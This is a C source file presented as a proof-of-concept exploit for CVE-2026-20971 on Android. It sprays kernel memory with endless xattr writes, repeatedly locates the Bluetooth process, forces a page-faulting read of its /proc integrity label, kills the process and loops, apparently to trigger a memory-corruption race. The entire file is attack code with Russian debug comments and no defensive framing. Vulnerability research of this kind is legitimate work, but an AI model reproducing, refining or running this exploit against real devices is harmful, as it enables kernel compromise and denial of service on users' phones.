#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <string.h>
#include <signal.h>
#include <dirent.h>
#include <sys/xattr.h>
#include <pthread.h>
#include <errno.h>

int find_pid(const char *name) {
    DIR *dir = opendir("/proc");
    struct dirent *entry;
    int pid = -1;
    if (!dir) return -1;
    
    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR) {
            int id = atoi(entry->d_name);
            if (id > 0) {
                char path[256], cmdline[128];
                snprintf(path, sizeof(path), "/proc/%d/cmdline", id);
                int fd = open(path, O_RDONLY);
                if (fd >= 0) {
                    int n = read(fd, cmdline, sizeof(cmdline)-1);
                    close(fd);
                    if (n > 0) {
                        cmdline[n] = '\0';
                        if (strstr(cmdline, name) != NULL) {
                            pid = id;
                            break;
                        }
                    }
                }
            }
        }
    }
    closedir(dir);
    return pid;
}

void* spray_thread(void* arg) {
    char value[56]; 
    memset(value, 0xFF, sizeof(value)); 
    char path[64];
    snprintf(path, sizeof(path), "/data/local/tmp/spray_%d", gettid());
    int fd = open(path, O_CREAT | O_RDWR, 0600);
    if (fd >= 0) close(fd);

    long count = 0;
    while(1) {
        char name[64];
        snprintf(name, sizeof(name), "user.spray_%ld", count++);
        setxattr(path, name, value, sizeof(value), 0);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);
    printf("[*] CVE-2026-20971 PoC v8 (Debug)\n");

    // Запускаем 2 потока спрея (чтобы не убить телефон OOM'ом)
    for (int i=0; i<2; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_thread, NULL);
        pthread_detach(tid);
    }

    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    long iterations = 0;

    while (1) {
        int pid = find_pid("com.android.bluetooth");
        if (pid == -1) {
            printf("[-] Bluetooth not found. Waiting 1 sec...\n");
            // Пытаемся запустить Bluetooth через системный сервис
            system("cmd bluetooth_manager enable > /dev/null 2>&1"); 
            sleep(1); 
            continue;
        }

        printf("[+] Found PID: %d. Reading label...\n", pid);
        char path[64];
        snprintf(path, sizeof(path), "/proc/%d/integrity/label", pid);

        madvise(buf, 4096, MADV_DONTNEED);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            printf("[*] Executing read() (will page fault)...\n");
            read(fd, buf, 4096); 
            close(fd);
            printf("[*] Read completed.\n");
        } else {
            printf("[-] Failed to open label: %s\n", strerror(errno));
        }

        printf("[*] Killing PID %d...\n", pid);
        int ret = kill(pid, SIGKILL);
        if (ret < 0 && errno != ESRCH) {
            printf("[-] Kill failed: %s\n", strerror(errno));
        }
        
        iterations++;
        printf("[*] Iteration %ld done.\n\n", iterations);
    }
    return 0;
}